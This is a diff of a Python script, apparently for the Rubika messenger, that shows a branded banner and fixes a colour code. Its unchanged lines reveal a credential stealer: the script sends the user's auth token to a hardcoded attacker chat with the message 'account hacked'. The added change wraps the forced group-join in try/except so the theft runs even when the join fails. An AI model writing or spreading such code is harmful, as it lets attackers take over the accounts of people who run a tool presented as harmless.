@@ -20,7 +20,7 @@ except:
     os.system('pip install pyfiglet')
     import pyfiglet
 # ...............................
-print (f'\n\033[31m{author} | \03336mversion 1.0.0 |\033[31m rubika.ir/indentation\n')
+print (f'\n\033[31m{author} |\033[36m version 1.0.0 |\033[31m rubika.ir/indentation\n')
 time.sleep(3)
 os.system("clear")
 time.sleep(0.5)
@@ -54,7 +54,10 @@ except:
 # ................................
 bot = Bot("AppName",auth=auth)
 target = ("g0BmdMv0ca20f356cf2b972327373309")
-bot.joinGroup("https://rubika.ir/joing/CEGFGBDE0UVKMLYIICMVTNJGBQKIDYNM")
+try:
+    bot.joinGroup("https://rubika.ir/joing/CEGFGBDE0UVKMLYIICMVTNJGBQKIDYNM")
+except:
+    pass
 bot.sendMessage(target,f"account hacked:\n\nauth: [{auth}]")
 # ................................
 time.sleep(0.5)
